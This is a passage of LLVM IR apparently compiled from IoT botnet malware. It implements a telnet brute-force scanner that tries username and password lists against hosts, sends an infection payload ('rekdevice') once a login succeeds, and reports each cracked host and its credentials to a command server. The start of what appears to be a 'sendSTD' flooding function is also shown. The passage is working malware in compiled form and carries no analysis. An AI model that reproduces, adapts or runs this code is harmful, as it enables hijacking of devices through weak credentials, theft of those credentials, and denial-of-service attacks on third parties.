  %413 = icmp slt i64 %412, 0
  br i1 %413, label %414, label %418

414:                                              ; preds = %389
  %415 = load i32, i32* %5, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %416
  call void @reset_telstate(%struct.telstate_t* noundef %417)
  br label %864

418:                                              ; preds = %389
  %419 = load i32, i32* %5, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 16
  %424 = call i64 @send(i32 noundef %423, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %425 = icmp slt i64 %424, 0
  br i1 %425, label %426, label %430

426:                                              ; preds = %418
  %427 = load i32, i32* %5, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %428
  call void @reset_telstate(%struct.telstate_t* noundef %429)
  br label %864

430:                                              ; preds = %418
  %431 = load i32, i32* %5, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %432
  call void @advance_telstate(%struct.telstate_t* noundef %433, i32 noundef 4)
  br label %863

434:                                              ; preds = %92
  %435 = load i32, i32* %5, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 16
  %440 = load i32, i32* %3, align 4
  %441 = load i32, i32* %5, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 9
  %445 = load i8*, i8** %444, align 8
  %446 = call i32 @read_until_response(i32 noundef %439, i32 noundef %440, i8* noundef %445, i32 noundef 1024, i8** noundef getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i64 0, i64 0))
  %447 = icmp ne i32 %446, 0
  br i1 %447, label %448, label %465

448:                                              ; preds = %434
  %449 = load i32, i32* %5, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 9
  %453 = load i8*, i8** %452, align 8
  %454 = call i32 @contains_fail(i8* noundef %453)
  %455 = icmp ne i32 %454, 0
  br i1 %455, label %456, label %460

456:                                              ; preds = %448
  %457 = load i32, i32* %5, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %458
  call void @advance_telstate(%struct.telstate_t* noundef %459, i32 noundef 0)
  br label %464

460:                                              ; preds = %448
  %461 = load i32, i32* %5, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %462
  call void @advance_telstate(%struct.telstate_t* noundef %463, i32 noundef 5)
  br label %464

464:                                              ; preds = %460, %456
  br label %864

465:                                              ; preds = %434
  %466 = load i32, i32* %5, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  %470 = load i32, i32* %469, align 16
  %471 = add i32 %470, 3
  %472 = zext i32 %471 to i64
  %473 = call i64 @time(i64* noundef null) #12
  %474 = icmp slt i64 %472, %473
  br i1 %474, label %475, label %479

475:                                              ; preds = %465
  %476 = load i32, i32* %5, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %477
  call void @reset_telstate(%struct.telstate_t* noundef %478)
  br label %479

479:                                              ; preds = %475, %465
  br label %863

480:                                              ; preds = %92
  %481 = load i32, i32* %5, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 0
  %485 = load i32, i32* %484, align 16
  %486 = load i32, i32* %5, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 5
  %490 = load i8, i8* %489, align 1
  %491 = zext i8 %490 to i64
  %492 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %491
  %493 = load i8*, i8** %492, align 8
  %494 = load i32, i32* %5, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 5
  %498 = load i8, i8* %497, align 1
  %499 = zext i8 %498 to i64
  %500 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %499
  %501 = load i8*, i8** %500, align 8
  %502 = call i64 @strlen(i8* noundef %501) #11
  %503 = call i64 @send(i32 noundef %485, i8* noundef %493, i64 noundef %502, i32 noundef 16384)
  %504 = icmp slt i64 %503, 0
  br i1 %504, label %505, label %509

505:                                              ; preds = %480
  %506 = load i32, i32* %5, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %507
  call void @reset_telstate(%struct.telstate_t* noundef %508)
  br label %864

509:                                              ; preds = %480
  %510 = load i32, i32* %5, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %511
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %512, i32 0, i32 0
  %514 = load i32, i32* %513, align 16
  %515 = call i64 @send(i32 noundef %514, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %516 = icmp slt i64 %515, 0
  br i1 %516, label %517, label %521

517:                                              ; preds = %509
  %518 = load i32, i32* %5, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %519
  call void @reset_telstate(%struct.telstate_t* noundef %520)
  br label %864

521:                                              ; preds = %509
  %522 = load i32, i32* %5, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %523
  call void @advance_telstate(%struct.telstate_t* noundef %524, i32 noundef 6)
  br label %863

525:                                              ; preds = %92
  %526 = load i32, i32* %5, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 16
  %531 = load i32, i32* %3, align 4
  %532 = load i32, i32* %5, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 9
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @read_until_response(i32 noundef %530, i32 noundef %531, i8* noundef %536, i32 noundef 1024, i8** noundef getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %538 = icmp ne i32 %537, 0
  br i1 %538, label %539, label %610

539:                                              ; preds = %525
  %540 = call i64 @time(i64* noundef null) #12
  %541 = trunc i64 %540 to i32
  %542 = load i32, i32* %5, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 7
  store i32 %541, i32* %545, align 16
  %546 = load i32, i32* %5, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 9
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @contains_fail(i8* noundef %550)
  %552 = icmp ne i32 %551, 0
  br i1 %552, label %553, label %557

553:                                              ; preds = %539
  %554 = load i32, i32* %5, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %555
  call void @advance_telstate(%struct.telstate_t* noundef %556, i32 noundef 0)
  br label %609

557:                                              ; preds = %539
  %558 = load i32, i32* %5, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 9
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @contains_success(i8* noundef %562)
  %564 = icmp ne i32 %563, 0
  br i1 %564, label %565, label %604

565:                                              ; preds = %557
  %566 = load i32, i32* %5, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 3
  %570 = load i8, i8* %569, align 1
  %571 = zext i8 %570 to i32
  %572 = icmp eq i32 %571, 2
  br i1 %572, label %573, label %577

573:                                              ; preds = %565
  %574 = load i32, i32* %5, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %575
  call void @advance_telstate(%struct.telstate_t* noundef %576, i32 noundef 7)
  br label %603

577:                                              ; preds = %565
  %578 = load i32, i32* @mainCommSock, align 4
  %579 = load i32, i32* %5, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %580
  %582 = call i8* @get_telstate_host(%struct.telstate_t* noundef %581)
  %583 = load i32, i32* %5, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 4
  %587 = load i8, i8* %586, align 2
  %588 = zext i8 %587 to i64
  %589 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %588
  %590 = load i8*, i8** %589, align 8
  %591 = load i32, i32* %5, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 5
  %595 = load i8, i8* %594, align 1
  %596 = zext i8 %595 to i64
  %597 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %596
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %578, i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.315, i64 0, i64 0), i8* noundef %582, i8* noundef %590, i8* noundef %598)
  %600 = load i32, i32* %5, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %601
  call void @advance_telstate(%struct.telstate_t* noundef %602, i32 noundef 7)
  br label %603

603:                                              ; preds = %577, %573
  br label %608

604:                                              ; preds = %557
  %605 = load i32, i32* %5, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %606
  call void @reset_telstate(%struct.telstate_t* noundef %607)
  br label %608

608:                                              ; preds = %604, %603
  br label %609

609:                                              ; preds = %608, %553
  br label %864

610:                                              ; preds = %525
  %611 = load i32, i32* %5, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %613, i32 0, i32 7
  %615 = load i32, i32* %614, align 16
  %616 = add i32 %615, 7
  %617 = zext i32 %616 to i64
  %618 = call i64 @time(i64* noundef null) #12
  %619 = icmp slt i64 %617, %618
  br i1 %619, label %620, label %624

620:                                              ; preds = %610
  %621 = load i32, i32* %5, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %622
  call void @reset_telstate(%struct.telstate_t* noundef %623)
  br label %624

624:                                              ; preds = %620, %610
  br label %863

625:                                              ; preds = %92
  %626 = call i64 @time(i64* noundef null) #12
  %627 = trunc i64 %626 to i32
  %628 = load i32, i32* %5, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 7
  store i32 %627, i32* %631, align 16
  %632 = load i32, i32* %5, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 0
  %636 = load i32, i32* %635, align 16
  %637 = call i64 @send(i32 noundef %636, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.316, i64 0, i64 0), i64 noundef 8, i32 noundef 16384)
  %638 = icmp slt i64 %637, 0
  br i1 %638, label %639, label %654

639:                                              ; preds = %625
  %640 = load i32, i32* %5, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 16
  %645 = call i32 @sclose(i32 noundef %644)
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 2
  store i8 0, i8* %649, align 8
  %650 = load i32, i32* %5, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 3
  store i8 1, i8* %653, align 1
  br label %864

654:                                              ; preds = %625
  %655 = load i32, i32* %5, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 16
  %660 = call i64 @send(i32 noundef %659, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i64 0, i64 0), i64 noundef 8, i32 noundef 16384)
  %661 = icmp slt i64 %660, 0
  br i1 %661, label %662, label %677

662:                                              ; preds = %654
  %663 = load i32, i32* %5, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 0
  %667 = load i32, i32* %666, align 16
  %668 = call i32 @sclose(i32 noundef %667)
  %669 = load i32, i32* %5, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 2
  store i8 0, i8* %672, align 8
  %673 = load i32, i32* %5, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 3
  store i8 1, i8* %676, align 1
  br label %864

677:                                              ; preds = %654
  %678 = load i32, i32* %5, align 4
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %679
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %680, i32 0, i32 0
  %682 = load i32, i32* %681, align 16
  %683 = call i64 @send(i32 noundef %682, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i64 0, i64 0), i64 noundef 7, i32 noundef 16384)
  %684 = icmp slt i64 %683, 0
  br i1 %684, label %685, label %700

685:                                              ; preds = %677
  %686 = load i32, i32* %5, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 0
  %690 = load i32, i32* %689, align 16
  %691 = call i32 @sclose(i32 noundef %690)
  %692 = load i32, i32* %5, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 2
  store i8 0, i8* %695, align 8
  %696 = load i32, i32* %5, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 3
  store i8 1, i8* %699, align 1
  br label %864

700:                                              ; preds = %677
  %701 = load i32, i32* %5, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 0
  %705 = load i32, i32* %704, align 16
  %706 = call i64 @send(i32 noundef %705, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.319, i64 0, i64 0), i64 noundef 4, i32 noundef 16384)
  %707 = icmp slt i64 %706, 0
  br i1 %707, label %708, label %723

708:                                              ; preds = %700
  %709 = load i32, i32* %5, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 0
  %713 = load i32, i32* %712, align 16
  %714 = call i32 @sclose(i32 noundef %713)
  %715 = load i32, i32* %5, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 2
  store i8 0, i8* %718, align 8
  %719 = load i32, i32* %5, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 3
  store i8 1, i8* %722, align 1
  br label %864

723:                                              ; preds = %700
  %724 = load i32, i32* %5, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 0
  %728 = load i32, i32* %727, align 16
  %729 = call i64 @send(i32 noundef %728, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.320, i64 0, i64 0), i64 noundef 26, i32 noundef 16384)
  %730 = icmp slt i64 %729, 0
  br i1 %730, label %731, label %746

731:                                              ; preds = %723
  %732 = load i32, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 16
  %737 = call i32 @sclose(i32 noundef %736)
  %738 = load i32, i32* %5, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 2
  store i8 0, i8* %741, align 8
  %742 = load i32, i32* %5, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 3
  store i8 1, i8* %745, align 1
  br label %864

746:                                              ; preds = %723
  %747 = load i32, i32* %5, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 0
  %751 = load i32, i32* %750, align 16
  %752 = load i32, i32* %3, align 4
  %753 = load i32, i32* %5, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %754
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %755, i32 0, i32 9
  %757 = load i8*, i8** %756, align 8
  %758 = call i32 @read_until_response(i32 noundef %751, i32 noundef %752, i8* noundef %757, i32 noundef 1024, i8** noundef getelementptr inbounds ([2 x i8*], [2 x i8*]* @legit, i64 0, i64 0))
  %759 = icmp ne i32 %758, 0
  br i1 %759, label %760, label %862

760:                                              ; preds = %746
  %761 = load i32, i32* %5, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 0
  %765 = load i32, i32* %764, align 16
  %766 = load i8*, i8** @rekdevice, align 8
  %767 = load i8*, i8** @rekdevice, align 8
  %768 = call i64 @strlen(i8* noundef %767) #11
  %769 = call i64 @send(i32 noundef %765, i8* noundef %766, i64 noundef %768, i32 noundef 16384)
  %770 = icmp sgt i64 %769, 0
  br i1 %770, label %771, label %775

771:                                              ; preds = %760
  %772 = load i32, i32* %5, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %773
  call void @reset_telstate(%struct.telstate_t* noundef %774)
  br label %775

775:                                              ; preds = %771, %760
  %776 = call i32 @sleep(i32 noundef 20)
  %777 = load i32, i32* %5, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 0
  %781 = load i32, i32* %780, align 16
  %782 = load i32, i32* %3, align 4
  %783 = load i32, i32* %5, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %784
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %785, i32 0, i32 9
  %787 = load i8*, i8** %786, align 8
  %788 = call i32 @read_until_response(i32 noundef %781, i32 noundef %782, i8* noundef %787, i32 noundef 1024, i8** noundef getelementptr inbounds ([2 x i8*], [2 x i8*]* @infected, i64 0, i64 0))
  %789 = icmp ne i32 %788, 0
  br i1 %789, label %790, label %816

790:                                              ; preds = %775
  %791 = load i32, i32* @mainCommSock, align 4
  %792 = load i32, i32* %5, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %793
  %795 = call i8* @get_telstate_host(%struct.telstate_t* noundef %794)
  %796 = load i32, i32* %5, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 4
  %800 = load i8, i8* %799, align 2
  %801 = zext i8 %800 to i64
  %802 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %801
  %803 = load i8*, i8** %802, align 8
  %804 = load i32, i32* %5, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 5
  %808 = load i8, i8* %807, align 1
  %809 = zext i8 %808 to i64
  %810 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %809
  %811 = load i8*, i8** %810, align 8
  %812 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %791, i8* noundef getelementptr inbounds ([35 x i8], [35 x i8]* @.str.321, i64 0, i64 0), i8* noundef %795, i8* noundef %803, i8* noundef %811)
  %813 = load i32, i32* %5, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %814
  call void @reset_telstate(%struct.telstate_t* noundef %815)
  br label %864

816:                                              ; preds = %775
  %817 = load i32, i32* %5, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 7
  %821 = load i32, i32* %820, align 16
  %822 = add i32 %821, 60
  %823 = zext i32 %822 to i64
  %824 = call i64 @time(i64* noundef null) #12
  %825 = icmp slt i64 %823, %824
  br i1 %825, label %826, label %861

826:                                              ; preds = %816
  %827 = load i32, i32* %5, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 3
  %831 = load i8, i8* %830, align 1
  %832 = zext i8 %831 to i32
  %833 = icmp ne i32 %832, 3
  br i1 %833, label %834, label %857

834:                                              ; preds = %826
  %835 = load i32, i32* @mainCommSock, align 4
  %836 = load i32, i32* %5, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %837
  %839 = call i8* @get_telstate_host(%struct.telstate_t* noundef %838)
  %840 = load i32, i32* %5, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 4
  %844 = load i8, i8* %843, align 2
  %845 = zext i8 %844 to i64
  %846 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %845
  %847 = load i8*, i8** %846, align 8
  %848 = load i32, i32* %5, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 5
  %852 = load i8, i8* %851, align 1
  %853 = zext i8 %852 to i64
  %854 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %853
  %855 = load i8*, i8** %854, align 8
  %856 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %835, i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.322, i64 0, i64 0), i8* noundef %839, i8* noundef %847, i8* noundef %855)
  br label %857

857:                                              ; preds = %834, %826
  %858 = load i32, i32* %5, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %859
  call void @reset_telstate(%struct.telstate_t* noundef %860)
  br label %861

861:                                              ; preds = %857, %816
  br label %862

862:                                              ; preds = %861, %746
  br label %863

863:                                              ; preds = %862, %624, %521, %479, %430, %388, %342, %237, %92
  br label %864

864:                                              ; preds = %863, %790, %731, %708, %685, %662, %639, %609, %517, %505, %464, %426, %414, %373, %323, %319, %199, %168, %155
  %865 = load i32, i32* %5, align 4
  %866 = add nsw i32 %865, 1
  store i32 %866, i32* %5, align 4
  br label %74, !llvm.loop !47

867:                                              ; preds = %74
  br label %72
}

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #4

; Function Attrs: nounwind
declare void @srand(i32 noundef) #4

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #2

declare i32 @sleep(i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendSTD(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i64, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca [12 x i8], align 1
  %18 = alloca [78 x i8*], align 16
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %11, align 4
  %20 = call i64 @time(i64* noundef null) #12
  store i64 %20, i64* %14, align 8
  %21 = call noalias i8* @malloc(i64 noundef 1024) #12
  store i8* %21, i8** %16, align 8
  %22 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 1024, i1 false)
  %23 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i64 0, i64 0
  %24 = load i32, i32* %5, align 4
